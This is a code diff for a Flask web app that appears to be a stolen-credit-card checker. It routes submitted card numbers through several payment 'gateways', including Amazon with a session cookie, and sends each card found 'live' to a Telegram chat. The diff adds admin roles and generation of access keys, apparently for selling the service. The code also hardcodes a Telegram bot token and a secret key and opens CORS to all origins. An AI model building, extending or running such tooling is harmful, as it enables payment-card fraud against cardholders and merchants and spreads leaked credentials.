@@ -1,5 +1,7 @@
 import os
 import asyncio
+import random
+import string
 from flask import Flask, request, jsonify, send_from_directory, session, redirect, url_for, render_template, flash
 from flask_cors import CORS
 from flask_sqlalchemy import SQLAlchemy
@@ -8,15 +10,14 @@ import requests as req
 import tec, red, em, amazon
 
 app = Flask(__name__)
-app.secret_key = 'tu_secreto_super_seguro'  # Cambia esto a algo seguro
-CORS(app, resources={r"/*": {"origins": "*"}})  # CORS abierto para evitar bloqueos
+app.secret_key = 'tu_secreto_super_seguro'
+CORS(app, resources={r"/*": {"origins": "*"}})
 
-# Configuración base de datos SQLite
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
+
 db = SQLAlchemy(app)
 
-# Modelos
 class User(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     username = db.Column(db.String(50), unique=True, nullable=False)
@@ -25,6 +26,7 @@ class User(db.Model):
 
     def set_password(self, password):
         self.password_hash = generate_password_hash(password)
+
     def check_password(self, password):
         return check_password_hash(self.password_hash, password)
 
@@ -33,11 +35,16 @@ class Key(db.Model):
     key = db.Column(db.String(50), unique=True, nullable=False)
     used = db.Column(db.Boolean, default=False)
 
+class TelegramUser(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    telegram_id = db.Column(db.String(50), unique=True, nullable=False)
+    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
+    is_admin = db.Column(db.Boolean, default=False)
+
 @app.before_request
 def create_tables():
     db.create_all()
 
-# Rutas
 @app.route('/')
 def index():
     if 'user_id' in session:
@@ -98,7 +105,51 @@ def logout():
     session.clear()
     return redirect(url_for('index'))
 
-# Telegram
+@app.route('/save_telegram_id', methods=['POST'])
+def save_telegram_id():
+    if 'user_id' not in session:
+        return jsonify({'error': 'No autenticado'}), 401
+
+    data = request.get_json()
+    telegram_id = data.get('telegram_id')
+    if not telegram_id:
+        return jsonify({'error': 'ID de Telegram requerido'}), 400
+
+    existing = TelegramUser.query.filter_by(user_id=session['user_id']).first()
+    if existing:
+        existing.telegram_id = telegram_id
+    else:
+        new_entry = TelegramUser(telegram_id=telegram_id, user_id=session['user_id'], is_admin=False)
+        db.session.add(new_entry)
+
+    db.session.commit()
+    return jsonify({'success': True, 'message': 'Telegram ID guardado.'})
+
+@app.route('/is_admin', methods=['GET'])
+def is_admin():
+    if 'user_id' not in session:
+        return jsonify({'is_admin': False})
+
+    user = TelegramUser.query.filter_by(user_id=session['user_id']).first()
+    if user and user.is_admin:
+        return jsonify({'is_admin': True})
+    return jsonify({'is_admin': False})
+
+@app.route('/generate_key', methods=['POST'])
+def generate_key():
+    if 'user_id' not in session:
+        return jsonify({'error': 'No autenticado'}), 401
+
+    user = TelegramUser.query.filter_by(user_id=session['user_id']).first()
+    if not user or not user.is_admin:
+        return jsonify({'error': 'No autorizado'}), 403
+
+    new_key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
+    key_entry = Key(key=new_key)
+    db.session.add(key_entry)
+    db.session.commit()
+    return jsonify({'success': True, 'key': new_key})
+
 TELEGRAM_BOT_TOKEN = '7549342155:AAGTeGoCr6s56nckuq8KEDDB7aCKiU5BW3Y'
 TELEGRAM_CHAT_ID = '-1002762787906'
 
@@ -110,7 +161,6 @@ def enviar_telegram(mensaje):
     except Exception as e:
         print(f"Error enviando Telegram: {e}")
 
-# Endpoint /check SÍNCRONO para evitar problemas con async en Flask
 @app.route('/check', methods=['POST'])
 def check_card():
     data = request.get_json()
@@ -126,12 +176,12 @@ def check_card():
         elif gateway == 'EM':
             result = asyncio.run(em.process_card(cc))
         elif gateway == 'AMAZON':
-            result = amazon.procesar_tarjeta_amazon(cc, cookie)  # Síncrono
+            result = amazon.procesar_tarjeta_amazon(cc, cookie)
         else:
             result = {'status': 'error', 'message': 'Gateway no válido', 'cc': cc}
 
         if result['status'] == 'live':
-            mensaje_telegram = f"✅ *LIVE* - {result['cc']}\n{result['message']}"
+            mensaje_telegram = f"\u2705 *LIVE* - {result['cc']}\n{result['message']}"
             enviar_telegram(mensaje_telegram)
 
         return jsonify(result)
@@ -145,5 +195,3 @@ def ping():
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port)
-
-
